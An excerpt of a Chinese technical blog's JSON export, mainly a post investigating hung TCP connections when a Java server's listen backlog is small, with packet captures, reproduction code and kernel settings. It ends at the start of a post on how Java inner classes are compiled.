class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> 117890 271.658989117  127.0.0.1             127.0.0.1             TCP      74     [TCP Port numbers reused] 40900 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298647083 TSecr=0 WS=128</span><br><span class=\"line\"> 201498 272.673187012  127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 40900 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298648097 TSecr=0 WS=128</span><br><span class=\"line\"> 201591 272.673232077  127.0.0.1             127.0.0.1             TCP      74     8083 → 40900 [SYN, ACK] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298648068 TSecr=298648097 WS=128</span><br><span class=\"line\"> 201643 272.673288084  127.0.0.1             127.0.0.1             TCP      66     40900 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298648097 TSecr=298648068</span><br><span class=\"line\"> 203783 297.152188039  127.0.0.1             127.0.0.1             TCP      66     40900 → 8083 [FIN, ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298672576 TSecr=298648068</span><br><span class=\"line\"> 203823 297.152451323  127.0.0.1             127.0.0.1             TCP      73     8083 → 40900 [PSH, ACK] Seq=1 Ack=2 Win=29312 Len=7 TSval=298672576 TSecr=298672576</span><br><span class=\"line\">0000  68 65 6c 6c 6f 0d 0a                              hello..</span><br><span class=\"line\"> 203825 297.152464118  127.0.0.1             127.0.0.1             TCP      54     40900 → 8083 [RST] Seq=2 Win=0 Len=0</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>第二种情况的报文，这种是client hang住很久才关掉整个client进程时出现的情况</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> 21004 108.400081512  127.0.0.1             127.0.0.1             TCP      74     46538 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298483826 TSecr=0 WS=128</span><br><span class=\"line\"> 92060 109.409186851  127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 46538 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298484836 TSecr=0 WS=128</span><br><span class=\"line\"> 92108 109.409228584  127.0.0.1             127.0.0.1             TCP      74     8083 → 46538 [SYN, ACK] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298484804 TSecr=298484836 WS=128</span><br><span class=\"line\"> 92155 109.409268850  127.0.0.1             127.0.0.1             TCP      66     46538 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298484836 TSecr=298484804</span><br><span class=\"line\">112908 254.340209126  127.0.0.1             127.0.0.1             TCP      66     46538 → 8083 [FIN, ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298629764 TSecr=298484804</span><br><span class=\"line\">112909 254.340214301  127.0.0.1             127.0.0.1             TCP      54     8083 → 46538 [RST] Seq=1 Win=0 Len=0</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"复现\"><a href=\"#复现\" class=\"headerlink\" title=\"复现\"></a>复现</h3><ul>\n<li><p>server</p>\n <figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.ServerSocket;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.Socket;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.Executor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.Executors;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestBacklogServer</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">        Executor executor = Executors.newFixedThreadPool(<span class=\"number\">128</span>);</span><br><span class=\"line\">        ServerSocket socket = <span class=\"keyword\">new</span> ServerSocket(<span class=\"number\">8083</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">        <span class=\"keyword\">int</span> cnt = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"keyword\">true</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">final</span> Socket client = socket.accept();</span><br><span class=\"line\">            System.out.println(cnt + <span class=\"string\">\": accept one: \"</span> + client.getRemoteSocketAddress());</span><br><span class=\"line\">            cnt++;</span><br><span class=\"line\">            executor.execute(() -&gt; &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    client.getOutputStream().write(<span class=\"string\">\"hello\\r\\n\"</span>.getBytes());</span><br><span class=\"line\">                    client.close();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>client。之所以设置了timeout，是为了拿到hang住的端口号，测试时可以不设置timeout，然后在没有新的输出时，threadDump，可以看到有多个链接hang在read那里</p>\n <figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.BufferedReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileReader;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.ServerSocket;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.Socket;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.SocketTimeoutException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashSet;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Vector;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.ExecutorService;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.Executors;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.TimeUnit;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.atomic.LongAdder;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.Matcher;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.Pattern;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestBacklogClient</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> LongAdder adder = <span class=\"keyword\">new</span> LongAdder();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class=\"line\">        Vector&lt;Integer&gt; timeoutPorts = <span class=\"keyword\">new</span> Vector&lt;&gt;(<span class=\"number\">1240</span>);</span><br><span class=\"line\">        ExecutorService pool = Executors.newFixedThreadPool(<span class=\"number\">128</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10240</span>; i++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> finalI = i;</span><br><span class=\"line\">            pool.execute(() -&gt; &#123;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    Socket socket = <span class=\"keyword\">new</span> Socket(<span class=\"string\">\"localhost\"</span>, <span class=\"number\">8083</span>);</span><br><span class=\"line\">                    socket.setSoTimeout(<span class=\"number\">1024</span> * <span class=\"number\">10</span>);</span><br><span class=\"line\">                    System.out.println(<span class=\"string\">\"connect Success one: \"</span> + finalI);</span><br><span class=\"line\">                    String r = readLine(socket.getInputStream());</span><br><span class=\"line\">                    <span class=\"keyword\">assert</span> r == <span class=\"keyword\">null</span> || <span class=\"string\">\"hello\\r\\n\"</span>.equals(r);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (r == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                        timeoutPorts.add(socket.getLocalPort());</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    System.out.println(<span class=\"string\">\"read success one: \"</span> + finalI);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        pool.shutdown();</span><br><span class=\"line\">        pool.awaitTermination(<span class=\"number\">1024</span>, TimeUnit.DAYS);</span><br><span class=\"line\">        System.out.println(adder.sum());</span><br><span class=\"line\">        System.out.println(timeoutPorts);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String <span class=\"title\">readLine</span><span class=\"params\">(InputStream in)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] buf = <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[<span class=\"number\">1024</span>];</span><br><span class=\"line\">        StringBuilder builder = <span class=\"keyword\">new</span> StringBuilder();</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (<span class=\"keyword\">true</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> t = in.read(buf);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (t &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                builder.append(<span class=\"keyword\">new</span> String(buf, <span class=\"number\">0</span>, t));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> builder.toString();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (SocketTimeoutException ex) &#123;</span><br><span class=\"line\">            adder.add(<span class=\"number\">1</span>);</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"time out, read: \"</span> + builder.length()</span><br><span class=\"line\">                    + <span class=\"string\">\", \"</span> + builder.toString()</span><br><span class=\"line\">                    + <span class=\"string\">\", hasCRLF: \"</span> + (builder.lastIndexOf(<span class=\"string\">\"\\r\\n\"</span>) &gt;= <span class=\"number\">0</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>localhost的系统配置信息</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ uname -r</span><br><span class=\"line\">4.18.0-13-generic</span><br><span class=\"line\"></span><br><span class=\"line\">$ /bin/cat /proc/sys/net/ipv4/tcp_max_syn_backlog</span><br><span class=\"line\">512</span><br><span class=\"line\"></span><br><span class=\"line\">$ lsb_release -a</span><br><span class=\"line\">No LSB modules are available.</span><br><span class=\"line\">Distributor ID:\tUbuntu</span><br><span class=\"line\">Description:\tUbuntu 18.10</span><br><span class=\"line\">Release:\t18.10</span><br><span class=\"line\">Codename:\tcosmic</span><br><span class=\"line\"></span><br><span class=\"line\">$ java -version                  </span><br><span class=\"line\">openjdk version &quot;11.0.1&quot; 2018-10-16</span><br><span class=\"line\">OpenJDK Runtime Environment 18.9 (build 11.0.1+13)</span><br><span class=\"line\">OpenJDK 64-Bit Server VM 18.9 (build 11.0.1+13, mixed mode)</span><br><span class=\"line\"></span><br><span class=\"line\">$ /bin/cat /proc/sys/net/core/somaxconn    </span><br><span class=\"line\">128</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>vps的配置信息</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@vultr:~# ./jdk-11.0.2/bin/java -version</span><br><span class=\"line\">java version &quot;11.0.2&quot; 2019-01-15 LTS</span><br><span class=\"line\">Java(TM) SE Runtime Environment 18.9 (build 11.0.2+9-LTS)</span><br><span class=\"line\">Java HotSpot(TM) 64-Bit Server VM 18.9 (build 11.0.2+9-LTS, mixed mode)</span><br><span class=\"line\"></span><br><span class=\"line\">root@vultr:~# uname -r</span><br><span class=\"line\">4.18.0-10-generic</span><br><span class=\"line\"></span><br><span class=\"line\">root@vultr:~# lsb_release -a</span><br><span class=\"line\">No LSB modules are available.</span><br><span class=\"line\">Distributor ID: Ubuntu</span><br><span class=\"line\">Description:    Ubuntu 18.10</span><br><span class=\"line\">Release:        18.10</span><br><span class=\"line\">Codename:       cosmic</span><br><span class=\"line\"></span><br><span class=\"line\">root@vultr:~# /bin/cat /proc/sys/net/ipv4/tcp_max_syn_backlog</span><br><span class=\"line\">128</span><br><span class=\"line\"></span><br><span class=\"line\">root@vultr:~# /bin/cat /proc/sys/net/core/somaxconn</span><br><span class=\"line\">128</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>复现过程出现过这个现象：client端<code>ctrl-c</code>关掉后，server端突然就接收到了剩下的所有链接。这个在server运行在localhost时并且 一旦所有其他没有被hang住的链接完成后马上就<code>ctrl-c</code>时出现过，但是在server运行在vps上没出现过。</p>\n</li>\n</ul>\n<h3 id=\"猜测原因一\"><a href=\"#猜测原因一\" class=\"headerlink\" title=\"猜测原因一\"></a>猜测原因一</h3><ul>\n<li><p>按照TCP/IP详解卷二的说法，如果listen的那个端点的队列满了（已经完成三次握手的队列，其大小由backlog确定），那么就不回复syn。但是，有个问题，如果多个syn同时到达，那么即使这时候队列未满，也可能接受了这些syn的一部分后队列就满了，那么linux系统如何处理——是否会存在有些链接三次握手完成，但是放不进队列里。</p>\n</li>\n<li><p>按照这篇文章(<a href=\"http://veithen.io/2014/01/01/how-tcp-backlog-works-in-linux.html\" target=\"_blank\" rel=\"noopener\">http://veithen.io/2014/01/01/how-tcp-backlog-works-in-linux.html</a>)的说法，如果遇到这种情况，服务器会不断发送<code>syn/ack</code>报文（如果<code>/proc/sys/net/ipv4/tcp_abort_on_overflow</code>是<code>1</code>，则发送RST）</p>\n</li>\n<li><p>我自己也抓到了这种报文，其中8083是server，server的backlog只有10，然后有10240个client企图链接该server。</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">No.     Time           Source                Destination           Protocol Length Info</span><br><span class=\"line\"> 117974 271.659812650  127.0.0.1             127.0.0.1             TCP      74     [TCP Port numbers reused] 40970 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298647084 TSecr=0 WS=128</span><br><span class=\"line\"> 117976 271.659818367  127.0.0.1             127.0.0.1             TCP      74     8083 → 40970 [SYN, ACK, ECN] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298647084 TSecr=298647084 WS=128</span><br><span class=\"line\"> 117977 271.659825016  127.0.0.1             127.0.0.1             TCP      66     40970 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298647084 TSecr=298647084</span><br><span class=\"line\"> 201482 272.673178662  127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 8083 → 40970 [SYN, ACK, ECN] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298648097 TSecr=298647084 WS=128</span><br><span class=\"line\"> 201563 272.673220860  127.0.0.1             127.0.0.1             TCP      66     [TCP Dup ACK 117977#1] 40970 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298648097 TSecr=298647084</span><br><span class=\"line\"> 201993 274.693205982  127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 8083 → 40970 [SYN, ACK, ECN] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=298650117 TSecr=298648097 WS=128</span><br><span class=\"line\"> 201995 274.693247830  127.0.0.1             127.0.0.1             TCP      66     [TCP Dup ACK 117977#2] 40970 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=298650117 TSecr=298647084</span><br><span class=\"line\"> 201997 274.693527487  127.0.0.1             127.0.0.1             TCP      73     8083 → 40970 [PSH, ACK] Seq=1 Ack=1 Win=43776 Len=7 TSval=298650117 TSecr=298650117</span><br><span class=\"line\">0000  68 65 6c 6c 6f 0d 0a                              hello..</span><br><span class=\"line\"> 201999 274.693556287  127.0.0.1             127.0.0.1             TCP      66     40970 → 8083 [ACK] Seq=1 Ack=8 Win=43776 Len=0 TSval=298650117 TSecr=298650117</span><br><span class=\"line\"> 202001 274.695599421  127.0.0.1             127.0.0.1             TCP      66     8083 → 40970 [FIN, ACK] Seq=8 Ack=1 Win=43776 Len=0 TSval=298650119 TSecr=298650117</span><br><span class=\"line\"> 202009 274.737168658  127.0.0.1             127.0.0.1             TCP      66     40970 → 8083 [ACK] Seq=1 Ack=9 Win=43776 Len=0 TSval=298650161 TSecr=298650119</span><br><span class=\"line\"> 203731 297.151676910  127.0.0.1             127.0.0.1             TCP      66     40970 → 8083 [FIN, ACK] Seq=1 Ack=9 Win=43776 Len=0 TSval=298672575 TSecr=298650119</span><br><span class=\"line\"> 203732 297.151682855  127.0.0.1             127.0.0.1             TCP      66     8083 → 40970 [ACK] Seq=9 Ack=2 Win=43776 Len=0 TSval=298672575 TSecr=298672575</span><br></pre></td></tr></table></figure>\n<p> 在<code>/proc/sys/net/ipv4/tcp_abort_on_overflow</code>设为<code>1</code>之后，抓到了如下报文。需要注意，那个RST并不是服务器关闭了，服务器后面还对其他链接响应了很多报文</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">No.     Time           Source                Destination           Protocol Length Info</span><br><span class=\"line\">   5904 9.174057671    127.0.0.1             127.0.0.1             TCP      74     54448 → 8083 [SYN, ECN, CWR] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300065429 TSecr=0 WS=128</span><br><span class=\"line\">  92075 10.190560916   127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 54448 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300066446 TSecr=0 WS=128</span><br><span class=\"line\">  92209 12.206628025   127.0.0.1             127.0.0.1             TCP      74     [TCP Retransmission] 54448 → 8083 [SYN] Seq=0 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300068462 TSecr=0 WS=128</span><br><span class=\"line\">  92258 12.206814283   127.0.0.1             127.0.0.1             TCP      74     8083 → 54448 [SYN, ACK] Seq=0 Ack=1 Win=43690 Len=0 MSS=65495 SACK_PERM=1 TSval=300068462 TSecr=300068462 WS=128</span><br><span class=\"line\">  92319 12.207072233   127.0.0.1             127.0.0.1             TCP      66     54448 → 8083 [ACK] Seq=1 Ack=1 Win=43776 Len=0 TSval=300068462 TSecr=300068462</span><br><span class=\"line\">  92345 12.207466000   127.0.0.1             127.0.0.1             TCP      54     8083 → 54448 [RST] Seq=1 Win=0 Len=0</span><br></pre></td></tr></table></figure>\n<p> 需要注意，那个RST并不是服务器关闭了，服务器后面还对其他链接响应了很多报文——如下面所示，最后的那个No.为<code>92345</code>后面还有很多报文，都是8083端口的server与client的通信</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">No.     Time           Source                Destination           Protocol Length Info</span><br><span class=\"line\">  92345 12.207466000   127.0.0.1             127.0.0.1             TCP      54     8083 → 54448 [RST] Seq=1 Win=0 Len=0</span><br><span class=\"line\">  92346 12.207985091   127.0.0.1             127.0.0.1             TCP      73     8083 → 54168 [PSH, ACK] Seq=1 Ack=1 Win=43776 Len=7 TSval=300068463 TSecr=300068462</span><br><span class=\"line\">  92347 12.208004676   127.0.0.1             127.0.0.1             TCP      66     54168 → 8083 [ACK] Seq=1 Ack=8 Win=43776 Len=0 TSval=300068463 TSecr=300068463</span><br><span class=\"line\">  92348 12.208041224   127.0.0.1             127.0.0.1             TCP      66     8083 → 54168 [FIN, ACK] Seq=8 Ack=1 Win=43776 Len=0 TSval=300068463 TSecr=300068463</span><br><span class=\"line\">  92349 12.208052138   127.0.0.1             127.0.0.1             TCP      73     8083 → 54172 [PSH, ACK] Seq=1 Ack=1 Win=43776 Len=7 TSval=300068463 TSecr=300068462</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>然而，这个并不是上述问题的原因，因为打印出来的hang住的端口号，跟发生重传<code>syn/ack</code>的端口号对不上</p>\n</li>\n</ul>\n<h3 id=\"猜测原因二\"><a href=\"#猜测原因二\" class=\"headerlink\" title=\"猜测原因二\"></a>猜测原因二</h3><ul>\n<li>网上搜到这篇文章<a href=\"http://www.10tiao.com/html/749/201411/201005717/1.html\" target=\"_blank\" rel=\"noopener\">http://www.10tiao.com/html/749/201411/201005717/1.html</a></li>\n<li>案例分析（二）那里描述的现象刚好跟跟上述问题非常相似——也是client握手成功但是读不到信息，作者分析的原因是，第三次握手的ACK因为AcceptQueue溢出而被丢弃，导致client进入了ESTABLISHED状态，但是server只是在<code>SYN_RECV</code>状态，并且因为<code>net.ipv4.tcp_synack_retries=1</code>(我的测试机器的这个参数是5)，所以如果Server重传的SYN+ACK报文对应的ACK还是被丢弃，那么就会进入client以为连接成功，但是server并没有连接成功的状态</li>\n<li>然而，我把server架设到另一个机子上，然后使用<code>watch -n 0.5 &quot;netcat -n | grep 8083 | grep -i &quot;syn&quot;&quot;</code>检查server那里是否有链接是一直处于<code>syn_recv</code>状态，但是整个过程中看到的处于<code>SYN_RECV</code>状态的链接端口号都是在不断变动（说明它们不是hang住的链接），并且client端所有没有hang住的链接都完成后，只剩下hang住的链接时，server端是看不到处于<code>syn_recv</code>状态的链接的</li>\n<li>所以我认为可能也不是这个原因（欢迎指正！）</li>\n</ul>\n<h3 id=\"结尾\"><a href=\"#结尾\" class=\"headerlink\" title=\"结尾\"></a>结尾</h3><ul>\n<li>这个问题并没有解决，如果有大佬知道原因，或者有一些想法，欢迎与我交流，谢谢！</li>\n</ul>\n","slug":"高并发情况下backlog过低出现的问题","categories":[{"name":"网络编程","slug":"网络编程","permalink":"https://h-zex.github.io/categories/网络编程/"}],"tags":[{"name":"高并发","slug":"高并发","permalink":"https://h-zex.github.io/tags/高并发/"},{"name":"backlog","slug":"backlog","permalink":"https://h-zex.github.io/tags/backlog/"},{"name":"TCP","slug":"TCP","permalink":"https://h-zex.github.io/tags/TCP/"}]},{"title":"Java内部类、局部类的实现原理以及与内存可见性的关系","date":"2019-03-04T12:54:01.000Z","path":"2019/03/04/java内部类、局部类的实现原理/","text":"实现原理 以下内容一部分来自于core java第十版，一部分来自于我使用openjdk java1.8/java11的javac和fernflower这个反编译器反编译字节码得到的以下内容不确实是openjdk javac特有的实现，还是规范这样要求 对象内总有一个隐式引用， 它指向了创建它的外部类对象，比如下面的反编译代码 12345678910public class JavaLangTest &#123; public JavaLangTest() &#123; super(); &#125; public static void main(String[] var0) &#123; JavaLangTest.InnerClass var1 = new JavaLangTest.InnerClass(new JavaLangTest()); System.out.println(var1); &#125;&#125; 123456789class JavaLangTest$InnerClass &#123; // $FF: synthetic field final JavaLangTest this$0; private JavaLangTest$InnerClass(JavaLangTest var1) &#123; super(); this.this$0 = var1; &#125;&#125; 其对应与以下代码 12345678910public class JavaLangTest &#123; public static void main(String[] args) &#123; InnerClass innerClass = new JavaLangTest().new InnerClass(); System.out.println(innerClass); &#125; private class InnerClass &#123; &#125;&#125; 内部类是一种编译器现象，与虚拟机无关。编译器将会把内部类翻译成用$(美元符号）分隔外部类名与内部类名的常规类文件，而虚拟机则对此一无所知 内部类可以访问外围类的私有数据——无论是否static。这是一个编译器现象，那么也就是实际上这个内部类并没有魔法加持，那么它是如何访问外部类的private数据的？外部类会合成一个类似于 123static int access$100(JavaLangTest x0) &#123; return 